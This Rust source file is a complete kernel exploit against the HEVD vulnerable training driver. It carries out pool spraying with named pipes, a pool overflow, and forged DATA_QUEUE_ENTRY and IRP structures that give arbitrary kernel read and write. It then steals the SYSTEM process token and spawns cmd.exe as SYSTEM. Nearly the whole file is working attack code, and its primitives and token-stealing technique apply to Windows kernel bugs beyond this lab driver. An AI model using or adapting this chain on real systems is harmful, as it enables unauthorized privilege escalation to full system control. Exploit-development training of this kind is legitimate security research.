use std::ops::Index;

use crate::utils;
use crate::utils::Primitives;

use windows::Win32::{
    Foundation::*,
    Storage::FileSystem::*,
    System::{Memory::*, Pipes::*, Threading::*, IO::*},
};

// HEVD Data Only Exploit
// Contraints
// 1. No NtQuerySystemInformation
// 2. No Shellcode Execution
// 3. Non-Paged Pool Nx

#[allow(non_snake_case)]
#[repr(C)]
#[derive(Debug, Clone)]
pub struct DataQueueEntry {
    flink: u64,
    blink: u64,
    irp: *mut IRP,
    security_context: u64,
    entry_type: u32,
    quota_in_entry: u32,
    data_size: u32,
    x: u32,
}
#[allow(non_snake_case)]
#[repr(C)]
pub struct IRP {
    pub Type: std::ffi::c_short,
    pub Size: std::ffi::c_ushort,
    pub MdlAddress: *mut std::ffi::c_void,
    pub Flags: std::ffi::c_ulong,
    pub AssociatedIrp: *mut std::ffi::c_void,
    pub ThreadListEntry: LIST_ENTRY,
    pub IoStatus: IO_STATUS_BLOCK,
    pub RequestorMode: std::ffi::c_char,
    pub PendingReturned: bool,
    pub StackCount: std::ffi::c_char,
    pub CurrentLocation: std::ffi::c_char,
    pub Cancel: bool,
    pub CancelIrql: std::ffi::c_uchar,
    pub ApcEnvironment: std::ffi::c_char,
    pub AllocationFlags: std::ffi::c_uchar,
    pub UserIosb: *mut std::ffi::c_void,
    pub UserEvent: *mut std::ffi::c_void,
    pub Overlay: [std::ffi::c_char; 16],
    pub CancelRoutine: *mut std::ffi::c_void,
    pub UserBuffer: *mut std::ffi::c_void,
    pub TailIsWrong: std::ffi::c_char,
}

#[allow(non_snake_case)]
#[repr(C)]
pub struct LIST_ENTRY {
    pub Flink: *mut u64,
    pub Blink: *mut u64,
}

#[allow(non_snake_case)]
#[repr(C)]
pub struct IO_STATUS_BLOCK {
    pub Status: i32,
    pub Information: *mut std::ffi::c_void,
}

#[allow(non_snake_case)]
pub struct NamedPipeHandles {
    read: HANDLE,
    write: HANDLE,
}

type PioApcRoutine = *mut std::ffi::c_void;

// Function signature
#[link(name = "ntdll")]
extern "system" {
    fn NtFsControlFile(
        FileHandle: HANDLE,
        Event: HANDLE,
        ApcRoutine: PioApcRoutine,
        ApcContext: *mut std::ffi::c_void,
        IoStatusBlock: &mut IO_STATUS_BLOCK,
        FsControlCode: std::ffi::c_ulong,
        InputBuffer: *const std::ffi::c_void,
        InputBufferLength: std::ffi::c_ulong,
        OutputBuffer: *mut std::ffi::c_void,
        OutputBufferLength: std::ffi::c_ulong,
    ) -> NTSTATUS;
}

static mut FAKE_OBJ_PTR: *mut DataQueueEntry = std::ptr::null_mut();

static mut FAKE_OBJ_PTR_ALLOC: *mut std::ffi::c_void = std::ptr::null_mut();

static mut FAKE_OBJ_PTR_ALLOC2: u64 = 0;

static mut FAKE_IRP_PTR_ALLOC: *mut std::ffi::c_void = std::ptr::null_mut();

static mut SEQ_PIPE_HANDLE_STORE: Vec<NamedPipeHandles> = Vec::<NamedPipeHandles>::new();

static mut OBJECT_INDEX: usize = 0;

pub fn pause() {
    println!("[*] Pausing... (Avoiding BugCheck)");
    std::io::stdin().read_line(&mut String::new()).unwrap();
}

#[allow(unused_assignments)]
#[allow(unused_variables)]
#[allow(unused_mut)]
fn create_irp_named_pipe_object(ntfs_size: usize) -> NamedPipeHandles {
    // HEVD Object Size = 0x200
    const OBJ_SIZE: usize = 0x1B8;
    let mut buffer: [usize; OBJ_SIZE] = [0x4343434343434343; OBJ_SIZE]; // 0x1B8 + 0x48 (header of pipe object) = 0x200 (target allocation size)
    let mut read_pipe = HANDLE(0);
    let mut write_pipe = HANDLE(0);
    let mut result_length = 0;

    let mut data: [usize; OBJ_SIZE] = [0x4343434343434343; OBJ_SIZE];

    unsafe { std::ptr::copy(data.as_mut_ptr(), buffer.as_mut_ptr(), OBJ_SIZE) };

    let named_pipe = unsafe {
        CreateNamedPipeA(
            windows::core::PCSTR("\\\\.\\pipe\\wke".as_ptr()),
            PIPE_ACCESS_OUTBOUND | FILE_FLAG_OVERLAPPED,
            PIPE_TYPE_BYTE | PIPE_WAIT,
            PIPE_UNLIMITED_INSTANCES,
            OBJ_SIZE as u32,
            OBJ_SIZE as u32,
            0,
            std::ptr::null(),
        )
    };

    if named_pipe.is_err() {
        println!("{}", "[!] Failed creating IRP named pipe");

        return NamedPipeHandles {
            read: HANDLE(0),
            write: HANDLE(0),
        };
    }

    write_pipe = named_pipe.unwrap();

    read_pipe = unsafe {
        CreateFileA(
            windows::core::PCSTR("\\\\.\\pipe\\wke".as_ptr()),
            windows::Win32::Storage::FileSystem::FILE_ACCESS_FLAGS(
                windows::Win32::System::SystemServices::GENERIC_READ,
            ),
            windows::Win32::Storage::FileSystem::FILE_SHARE_MODE(0),
            std::ptr::null_mut(),
            OPEN_EXISTING,
            windows::Win32::Storage::FileSystem::FILE_FLAGS_AND_ATTRIBUTES(0),
            HANDLE(0),
        )
        .unwrap()
    };

    if read_pipe == HANDLE(0) {
        println!("{}", "[!] Failed creating named pipe file");

        return NamedPipeHandles {
            read: HANDLE(0),
            write: HANDLE(0),
        };
    }

    let mut fake_io_status_block: IO_STATUS_BLOCK = IO_STATUS_BLOCK {
        Status: 0,
        Information: std::ptr::null_mut(),
    };

    unsafe {
        NtFsControlFile(
            write_pipe,           // Replace with actual FileHandle
            HANDLE(0),            // Replace with actual Event
            std::ptr::null_mut(), // Replace with actual ApcRoutine
            std::ptr::null_mut(), // Replace with actual ApcContext
            &mut fake_io_status_block,
            0x119FF8,                      // Replace with actual FsControlCode
            buffer.as_mut_ptr() as *mut _, // Replace with actual InputBuffer
            ntfs_size as u32,              // Replace with actual InputBufferLength
            std::ptr::null_mut(),          // Replace with actual OutputBuffer
            0,                             // Replace with actual OutputBufferLength
        );
    };

    return NamedPipeHandles {
        read: HANDLE(0),
        write: write_pipe,
    };
}

#[allow(unused_assignments)]
#[allow(unused_variables)]
#[allow(unused_mut)]
fn create_named_pipe_objects() -> NamedPipeHandles {
    // HEVD Object Size = 0x200
    const OBJ_SIZE: usize = 0x1B8;
    let mut buffer: [usize; OBJ_SIZE] = [0x4141414141414141; OBJ_SIZE]; // 0x1B8 + 0x48 (header of pipe object) = 0x200 (target allocation size)
    let mut read_pipe = HANDLE(0);
    let mut write_pipe = HANDLE(0);
    let mut result_length = 0;

    let mut data: [usize; OBJ_SIZE] = [0x4141414141414141; OBJ_SIZE];

    unsafe { std::ptr::copy(data.as_mut_ptr(), buffer.as_mut_ptr(), OBJ_SIZE) };

    let named_pipe = unsafe {
        CreateNamedPipeA(
            windows::core::PCSTR("\\\\.\\pipe\\wke".as_ptr()),
            PIPE_ACCESS_OUTBOUND | FILE_FLAG_OVERLAPPED,
            PIPE_TYPE_BYTE | PIPE_WAIT,
            PIPE_UNLIMITED_INSTANCES,
            OBJ_SIZE as u32,
            OBJ_SIZE as u32,
            0,
            std::ptr::null(),
        )
    };

    if named_pipe.is_err() {
        panic!("[!] Failed creating named pipe");
    }

    write_pipe = named_pipe.unwrap();

    read_pipe = unsafe {
        CreateFileA(
            windows::core::PCSTR("\\\\.\\pipe\\wke".as_ptr()),
            windows::Win32::Storage::FileSystem::FILE_ACCESS_FLAGS(
                windows::Win32::System::SystemServices::GENERIC_READ,
            ),
            windows::Win32::Storage::FileSystem::FILE_SHARE_MODE(0),
            std::ptr::null_mut(),
            OPEN_EXISTING,
            windows::Win32::Storage::FileSystem::FILE_FLAGS_AND_ATTRIBUTES(0),
            HANDLE(0),
        )
        .unwrap()
    };

    if read_pipe == HANDLE(0) {
        panic!("Failed creating named pipe file");
    }

    if unsafe {
        !WriteFile(
            write_pipe,
            buffer.as_mut_ptr() as *mut _,
            OBJ_SIZE as u32,
            &mut result_length,
            std::ptr::null_mut(),
        )
        .as_bool()
    } {
        panic!("[!] Failed to write to named pipe");
    }

    return NamedPipeHandles {
        read: read_pipe,
        write: write_pipe,
    };
}

#[allow(unused_assignments)]
#[allow(unused_variables)]
#[allow(unused_mut)]
pub fn create_arb_read(driver: utils::HEVDPrimitives) {
    // Offset Into Next Chunk = 0x40 into 0x250 Buffer
    const OOB_LEN: usize = 0x250;
    let mut oob_data: [u64; OOB_LEN] = [0x4141414142424242; OOB_LEN];

    let lp_address = 0;
    const USER_DATA_STORE_LEN: usize = 0x5000;

    let mut bytes_written = 0;

    let user_data_store = unsafe {
        VirtualAlloc(
            lp_address as *mut std::os::raw::c_void,
            USER_DATA_STORE_LEN,
            MEM_COMMIT | MEM_RESERVE,
            PAGE_READWRITE,
        )
    };

    unsafe { std::ptr::copy(oob_data.as_ptr(), user_data_store as *mut _, OOB_LEN / 2) };

    let mut fake_io_status_block: IO_STATUS_BLOCK = IO_STATUS_BLOCK {
        Status: 0,
        Information: std::ptr::null_mut(),
    };

    let mut fake_list_entry: LIST_ENTRY = LIST_ENTRY {
        Flink: std::ptr::null_mut(),
        Blink: std::ptr::null_mut(),
    };

    let mut fake_irp: IRP = IRP {
        Type: 0,
        Size: 0,
        MdlAddress: std::ptr::null_mut(),
        Flags: 0,
        AssociatedIrp: std::ptr::null_mut(),
        ThreadListEntry: fake_list_entry,
        IoStatus: fake_io_status_block,
        RequestorMode: 0,
        PendingReturned: true,
        StackCount: 0,
        CurrentLocation: 0,
        Cancel: true,
        CancelIrql: 0,
        ApcEnvironment: 0,
        AllocationFlags: 0,
        UserIosb: std::ptr::null_mut(),
        UserEvent: std::ptr::null_mut(),
        Overlay: [0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0],
        CancelRoutine: std::ptr::null_mut(),
        UserBuffer: std::ptr::null_mut(),
        TailIsWrong: 0,
    };

    let fake_irp_addr = unsafe {
        VirtualAlloc(
            lp_address as *mut std::os::raw::c_void,
            std::mem::size_of_val(&fake_irp),
            MEM_COMMIT | MEM_RESERVE,
            PAGE_READWRITE,
        )
    };

    unsafe { std::ptr::copy(&fake_irp, fake_irp_addr as *mut _, 1) };

    unsafe { FAKE_IRP_PTR_ALLOC = fake_irp_addr };

    let mut fake_data_queue_entry: DataQueueEntry = DataQueueEntry {
        flink: 0,
        blink: 0,
        irp: fake_irp_addr as *mut _,
        security_context: 0,
        entry_type: 0,
        quota_in_entry: 0,
        data_size: 0,
        x: 0,
    };

    unsafe { FAKE_OBJ_PTR = &mut fake_data_queue_entry };

    fake_data_queue_entry.flink = 0x4141414141414141;
    fake_data_queue_entry.blink = 0x4242424242424242;
    fake_data_queue_entry.entry_type = 1;
    fake_data_queue_entry.data_size = u32::MAX;

    let fake_obj_addr = unsafe {
        VirtualAlloc(
            lp_address as *mut std::os::raw::c_void,
            std::mem::size_of_val(&fake_data_queue_entry),
            MEM_COMMIT | MEM_RESERVE,
            PAGE_READWRITE,
        )
    };

    unsafe { std::ptr::copy(&fake_data_queue_entry, fake_obj_addr as *mut _, 1) };

    unsafe { FAKE_OBJ_PTR_ALLOC = fake_obj_addr };

    unsafe { FAKE_OBJ_PTR_ALLOC2 = fake_obj_addr as u64 };

    let mut data_queue_entry: DataQueueEntry = fake_data_queue_entry.clone();

    data_queue_entry.flink = fake_obj_addr as u64; // fake obj flink & blink
    data_queue_entry.blink = fake_obj_addr as u64;
    data_queue_entry.irp = std::ptr::null_mut();
    data_queue_entry.security_context = 0;
    data_queue_entry.entry_type = 0;
    data_queue_entry.quota_in_entry = 0x1024;
    data_queue_entry.data_size = 0x1024; // sizeof(DATA_QUEUE_ENTRY) + FAKE_OBJ_SIZE + 0x20;
    data_queue_entry.x = 0;

    oob_data[0x40] = 0x7246704e0a200000; // Pool Tag  (PoolQuota bit not set)
    oob_data[0x41] = 0x0; // ProcessBilled (XOR'ed EPROCESS Pointer)

    unsafe {
        std::ptr::copy(
            &data_queue_entry,
            oob_data.as_ptr().offset(0x42) as *mut _,
            1,
        )
    };

    unsafe {
        if !DeviceIoControl(
            driver.driver_handle,
            driver.non_paged_pool_overflow_nx_ioctl,
            oob_data.as_mut_ptr() as *mut _,
            OOB_LEN as u32,
            std::ptr::null_mut(),
            0,
            &mut bytes_written,
            std::ptr::null_mut(),
        )
        .as_bool()
        {
            panic!("[!] Failed Calling Pool Overflow");
        }
    }
}

pub fn hex_to_u64(hex_string: String) -> u64 {
    let without_prefix = hex_string.trim_start_matches("0x");
    if let Ok(parsed_value) = i64::from_str_radix(without_prefix, 16) {
        return parsed_value.try_into().unwrap();
    } else {
        return 0;
    }
}

pub fn read_64(read_address: u64) -> u64 {
    const PIPE_READ_LEN: usize = 0x1024 + 0x256;

    let mut arb_pipe_read: [u32; PIPE_READ_LEN] = [0x0; PIPE_READ_LEN];

    let mut arb_bytes_read = 0;

    let fake_obj_ptr_transmute =
        unsafe { std::mem::transmute::<*mut std::ffi::c_void, &mut IRP>(FAKE_IRP_PTR_ALLOC) };

    fake_obj_ptr_transmute.AssociatedIrp = read_address as *mut _;

    unsafe {
        if OBJECT_INDEX == 0 {
            return 0;
        }
    };

    let read_object = unsafe { SEQ_PIPE_HANDLE_STORE.index(OBJECT_INDEX) };

    unsafe {
        PeekNamedPipe(
            read_object.read,
            arb_pipe_read.as_mut_ptr() as *mut _,
            PIPE_READ_LEN as u32,
            &mut arb_bytes_read,
            std::ptr::null_mut(),
            std::ptr::null_mut(),
        );
    }

    arb_pipe_read.to_vec();

    let high = arb_pipe_read.index(1034);
    let low = arb_pipe_read.index(1033);

    let hex_high = format!("{:#010x}", high);
    let hex_low = format!("{:#010x}", low);

    let read_content = hex_high.to_owned() + &hex_low.replace("0x", "");

    let parsed_value = u64::from_str_radix(&read_content[2..], 16);

    match parsed_value {
        Ok(value) => {
            return value;
        }
        Err(_) => {
            println!("{}", "HEX ERROR");
            return 0;
        }
    }
}

pub fn read_64_buffered(starting_address: u64, read_size: usize) -> Vec<u64> {
    let rounded_number = (read_size + 7) & !7usize;

    let mut read_buffer = Vec::<u64>::new();

    for i in (0..rounded_number).step_by(0x8) {
        read_buffer.push(read_64(starting_address + i as u64));
    }

    return read_buffer;
}

pub fn is_kernel_address(addr: u64) -> bool {
    // Define the kernel address range (example values)
    const KERNEL_START: u64 = 0xFFFF_8000_0000_0000;
    const KERNEL_END: u64 = 0xFFFF_FFFF_FFFF_FFFF;

    addr >= KERNEL_START && addr <= KERNEL_END
}

pub fn find_corrupted_ccb_dqe(starting_address: u64, depth: usize) -> Vec<u64> {
    let mut search_depth = 0;

    let ccb_root_entry: u64 = starting_address - 0xa8;
    let mut ccb_entry = read_64(ccb_root_entry + 0x20);

    let mut ret: Vec<u64> = Vec::<u64>::new();

    loop {
        let next_ccb = read_64(ccb_entry);
        let data_queue_entry = read_64(ccb_entry + 0x90);
        let data_queue_entry_flink = read_64(data_queue_entry);

        if !is_kernel_address(data_queue_entry_flink) && data_queue_entry_flink != 0 {
            println!(
                "[*] Corrupted CCB: {:x?} Corrupted DQE: {:x?}",
                ccb_entry, data_queue_entry
            );

            ret.push(ccb_entry);
            ret.push(data_queue_entry);

            break ret;
        }

        ccb_entry = next_ccb;
        search_depth = search_depth + 1;

        if search_depth == depth {
            println!("{}", "[!] Search exceeded depth");
            break ret;
        }
    }
}

pub fn find_dqe_irp(starting_address: u64, depth: usize) -> u64 {
    let mut search_depth = 0;
    let ccb_root_entry: u64 = starting_address - 0xa8;
    let mut ccb_entry = read_64(ccb_root_entry + 0x20);

    loop {
        let next_ccb = read_64(ccb_entry);
        let irp_data_queue_entry = read_64(ccb_entry + 0x90);
        let irp_read = read_64(irp_data_queue_entry + 0x10);

        if irp_read != 0 {
            println!(
                "[*] IRP CCB: {:x?} IRP DQE: {:x?}",
                ccb_entry, irp_data_queue_entry
            );
            break irp_read;
        }

        ccb_entry = next_ccb;
        search_depth = search_depth + 1;

        if search_depth == depth {
            println!("{}", "[!] Search exceeded depth");
            break 0;
        }
    }
}

pub fn find_crafted_irp_dqe(starting_address: u64, previous_irp: u64, depth: usize) -> u64 {
    let mut search_depth = 0;
    let ccb_root_entry: u64 = starting_address - 0xa8;
    let mut ccb_entry = read_64(ccb_root_entry + 0x20);

    loop {
        let next_ccb = read_64(ccb_entry);
        let irp_data_queue_entry = read_64(ccb_entry + 0x90);
        let irp_read = read_64(irp_data_queue_entry + 0x10);

        if irp_read != 0 && irp_read != previous_irp {
            println!(
                "[*] IRP CCB: {:x?} IRP DQE: {:x?}",
                ccb_entry, irp_data_queue_entry
            );

            break irp_data_queue_entry;
        }

        ccb_entry = next_ccb;
        search_depth = search_depth + 1;

        if search_depth == depth {
            println!("{}", "[!] Search exceeded depth");
            break 0;
        }
    }
}

pub fn get_eprocess_by_pid(eprocess: u64, pid: u64) -> u64 {
    let starting_eprocess: u64 = eprocess;
    let mut current_eprocess = starting_eprocess;

    loop {
        let next_eprocess = read_64(current_eprocess + 0x448);
        let next_pid = read_64(current_eprocess + 0x440);

        if next_pid == pid {
            println!("[*] Found EPROCESS for PID {}", pid);
            break current_eprocess;
        }

        current_eprocess = next_eprocess - 0x448;
    }
}

pub fn prepare_dqe_for_write(write_size: u32, crafted_irp: u64, flink: u64, blink: u64) {
    let fake_obj_ptr_transmute = unsafe {
        std::mem::transmute::<*mut std::ffi::c_void, &mut DataQueueEntry>(FAKE_OBJ_PTR_ALLOC)
    };

    fake_obj_ptr_transmute.flink = flink;
    fake_obj_ptr_transmute.blink = blink;
    fake_obj_ptr_transmute.entry_type = 0;
    fake_obj_ptr_transmute.security_context = 0;
    fake_obj_ptr_transmute.data_size = write_size;
    fake_obj_ptr_transmute.quota_in_entry = write_size - 1;
    fake_obj_ptr_transmute.irp = crafted_irp as *mut _;
}

#[allow(unused_assignments)]
#[allow(unused_variables)]
#[allow(unused_mut)]
pub fn hevd_data_only_exploit() {
    println!("[*] Starting Exploit");

    let driver: utils::HEVDPrimitives = utils::HEVDPrimitives::new();

    if driver.driver_handle == HANDLE(0) {
        panic!("[!] Failed to obtain device handle");
    }

    // Prepare heap to avoid chunks from getting merged (get us a fresh page to work in)

    println!("[*] Deframenting Pool");

    const SPRAY_LEN: usize = 60000;
    const OBJ_SIZE: usize = 0x1B8;

    let mut defrag_pipe_handle_store = Vec::<NamedPipeHandles>::new();

    for _ in 0..SPRAY_LEN {
        let pipe_handle = create_named_pipe_objects();
        defrag_pipe_handle_store.push(pipe_handle);
    }

    // Spray Sequential Objects in Pool

    println!("[*] Spraying Sequential Objects");

    unsafe {
        for _ in 0..SPRAY_LEN {
            let pipe_handle = create_named_pipe_objects();
            SEQ_PIPE_HANDLE_STORE.push(pipe_handle);
        }
    }

    // Create Holes in Pool

    println!("[*] Creating Object Holes");

    unsafe {
        for i in 0..SEQ_PIPE_HANDLE_STORE.len() {
            if i % 2 == 0 {
                let handles = SEQ_PIPE_HANDLE_STORE.index(i);

                CloseHandle(handles.read);
                CloseHandle(handles.write);
            }
        }
    }

    // Allocate Pool Overflow Object & Trigger OOB Write (Info Leak)

    println!("[*] Creating Arbitrary Read/Info Leak");

    create_arb_read(driver.clone());

    let mut flink_store: Vec<u64> = Vec::<u64>::new();

    unsafe {
        for obj_index in 0..SEQ_PIPE_HANDLE_STORE.len() {
            let pipe_obj = SEQ_PIPE_HANDLE_STORE.index(obj_index);

            const PIPE_READ_LEN: usize = 0x1024;

            let mut pipe_read: [usize; PIPE_READ_LEN] = [0x0; PIPE_READ_LEN];

            let mut bytes_read = 0;

            PeekNamedPipe(
                pipe_obj.read,
                pipe_read.as_mut_ptr() as *mut _,
                PIPE_READ_LEN as u32,
                &mut bytes_read,
                std::ptr::null_mut(),
                std::ptr::null_mut(),
            );

            if bytes_read > 440 {
                println!("[*] Found Corrupted Object");
                println!("[*] Bytes Read: {}", bytes_read);
                println!("[*] Object Index: {}", obj_index);

                OBJECT_INDEX = obj_index;

                for (index, value) in pipe_read.to_vec().iter().enumerate() {
                    let hex_leak = format!("{:#010x}", pipe_read.index(index));

                    if hex_leak == "0x7246704e0a200000" {
                        if index + 2 < pipe_read.len() {
                            flink_store.push(*pipe_read.index(index + 2) as u64)
                        }
                    }
                }

                break;
            }
        }
    }

    println!("[*] Performing Arbitrary Read");

    if flink_store.len() == 0 {
        println!("{}", "[!] No Flinks found");
        pause();
    }

    println!("{}", "[*] Locating Corrupted Entry");

    let mut corrupted_ccb = 0;
    let mut corrupted_dqe = 0;
    let mut irp_address = 0;
    let mut crafted_irp_dqe = 0;
    let mut crafted_irp_dqe_irp = 0;
    let mut crafted_irp_address = 0;

    for flink in flink_store.iter() {
        let corrupted_ccb_dqe = find_corrupted_ccb_dqe(*flink, 50000);
        if corrupted_ccb_dqe.len() != 0 {
            corrupted_ccb = corrupted_ccb_dqe[0];
            corrupted_dqe = corrupted_ccb_dqe[1];
            break;
        }
    }

    println!("{}", "[*] Creating IRP DQE");

    create_irp_named_pipe_object(OBJ_SIZE);

    println!("{}", "[*] Locating IRP Address");

    for flink in flink_store.iter() {
        irp_address = find_dqe_irp(*flink, 50000);
        if irp_address != 0 {
            break;
        }
    }

    println!("[*] Found IRP Address: {:x?}", irp_address);

    println!("{}", "[*] Locating current EPROCESS");

    let thread_list_flink = read_64(irp_address + 0x20);
    let thread_list_head = read_64(thread_list_flink + 0x38);
    let current_eprocess = read_64(thread_list_head - 0x318);
    let current_pid = read_64(current_eprocess + 0x440);

    println!("[*] Current EPROCESS: {:x?}", current_eprocess);
    println!("[*] Current PID: {:x?}", current_pid);

    println!("{}", "[*] Locating System EPROCESS");

    let system_eprocess = get_eprocess_by_pid(current_eprocess, 4);

    println!("[*] System EPROCESS: {:x?}", system_eprocess);

    println!("{}", "[*] Preparing Arbitrary Write");

    let mut crafted_irp_read = read_64_buffered(irp_address, std::mem::size_of::<IRP>() + 0x200);

    let crafted_irp =
        unsafe { std::mem::transmute::<*mut u64, &mut IRP>(crafted_irp_read.as_mut_ptr()) };

    let mut thread_list: [u64; 0x2] = [0x0; 0x2];

    crafted_irp.Flags = 0x60850;
    crafted_irp.AssociatedIrp = (system_eprocess + 0x4b8) as *mut _;
    crafted_irp.UserBuffer = (current_eprocess + 0x4b8) as *mut _;
    crafted_irp.ThreadListEntry.Flink = &mut thread_list as *mut _;
    crafted_irp.ThreadListEntry.Blink = &mut thread_list as *mut _;

    let mut crafted_irp_write = NamedPipeHandles {
        read: HANDLE(0),
        write: HANDLE(0),
    };

    let crafted_irp_named_pipe = unsafe {
        CreateNamedPipeA(
            windows::core::PCSTR("\\\\.\\pipe\\wke".as_ptr()),
            PIPE_ACCESS_OUTBOUND | FILE_FLAG_OVERLAPPED,
            PIPE_TYPE_BYTE | PIPE_WAIT,
            PIPE_UNLIMITED_INSTANCES,
            OBJ_SIZE as u32,
            OBJ_SIZE as u32,
            0,
            std::ptr::null(),
        )
    };

    crafted_irp_write.read = unsafe {
        CreateFileA(
            windows::core::PCSTR("\\\\.\\pipe\\wke".as_ptr()),
            windows::Win32::Storage::FileSystem::FILE_ACCESS_FLAGS(
                windows::Win32::System::SystemServices::GENERIC_READ,
            ),
            windows::Win32::Storage::FileSystem::FILE_SHARE_MODE(0),
            std::ptr::null_mut(),
            OPEN_EXISTING,
            windows::Win32::Storage::FileSystem::FILE_FLAGS_AND_ATTRIBUTES(0),
            HANDLE(0),
        )
        .unwrap()
    };

    crafted_irp_write.write = crafted_irp_named_pipe.unwrap();

    let mut fake_io_status_block: IO_STATUS_BLOCK = IO_STATUS_BLOCK {
        Status: 0,
        Information: std::ptr::null_mut(),
    };

    let target_obj = unsafe { SEQ_PIPE_HANDLE_STORE.index(OBJECT_INDEX) };

    unsafe {
        NtFsControlFile(
            crafted_irp_write.write, // Replace with actual FileHandle
            HANDLE(0),               // Replace with actual Event
            std::ptr::null_mut(),    // Replace with actual ApcRoutine
            std::ptr::null_mut(),    // Replace with actual ApcContext
            &mut fake_io_status_block,
            0x119FF8,                                  // Replace with actual FsControlCode
            crafted_irp_read.as_mut_ptr() as *mut _,   // Replace with actual InputBuffer
            std::mem::size_of::<IRP>() as u32 + 0x200, // Replace with actual InputBufferLength
            std::ptr::null_mut(),                      // Replace with actual OutputBuffer
            0,                                         // Replace with actual OutputBufferLength
        );
    };

    println!("{}", "[*] Locating Crafted IRP");

    for flink in flink_store.iter() {
        crafted_irp_dqe = find_crafted_irp_dqe(*flink, irp_address, 50000);
        if corrupted_dqe != 0 {
            break;
        }
    }

    crafted_irp_dqe_irp = read_64(crafted_irp_dqe + 0x10);
    crafted_irp_address = read_64(crafted_irp_dqe_irp + 0x18);

    println!("[*] Found Crafted IRP Address: {:x?}", crafted_irp_address);

    println!("{}", "[*] Updating Fake DQE");

    let write_size = 0x8;

    prepare_dqe_for_write(
        write_size,
        crafted_irp_address,
        corrupted_dqe,
        corrupted_dqe,
    );

    thread_list[0] = crafted_irp_address + std::mem::offset_of!(IRP, ThreadListEntry.Flink) as u64;
    thread_list[1] = crafted_irp_address + std::mem::offset_of!(IRP, ThreadListEntry.Flink) as u64;

    println!("{}", "[*] Triggering Arbitrary Write (Token Stealing)");

    let mut read_buffer: [usize; 0x100] = [0xFFFFFFFFFFFFFFFF; 0x100];

    let mut bytes_returned = 0;

    unsafe {
        ReadFile(
            target_obj.read,
            read_buffer.as_mut_ptr() as *mut _,
            1,
            &mut bytes_returned,
            std::ptr::null_mut(),
        );
    }

    println!("{}", "[*] Launching cmd.exe as NT\\AUTHORITY SYSTEM");

    let mut startup_info: STARTUPINFOA = unsafe { std::mem::zeroed() };
    startup_info.cb = std::mem::size_of::<STARTUPINFOA>() as u32;

    let mut process_info: PROCESS_INFORMATION = unsafe { std::mem::zeroed() };

    unsafe { Sleep(3000) };

    unsafe {
        CreateProcessA(
            windows::core::PCSTR(std::ptr::null_mut()),
            windows::core::PSTR(String::from("C:\\Windows\\System32\\cmd.exe\0").as_mut_ptr()),
            std::ptr::null_mut(),
            std::ptr::null_mut(),
            false,
            CREATE_NEW_CONSOLE | CREATE_UNICODE_ENVIRONMENT,
            std::ptr::null_mut(),
            windows::core::PCSTR(std::ptr::null_mut()),
            &mut startup_info,
            &mut process_info,
        );
    }

    println!("[*] Done");

    pause();
}
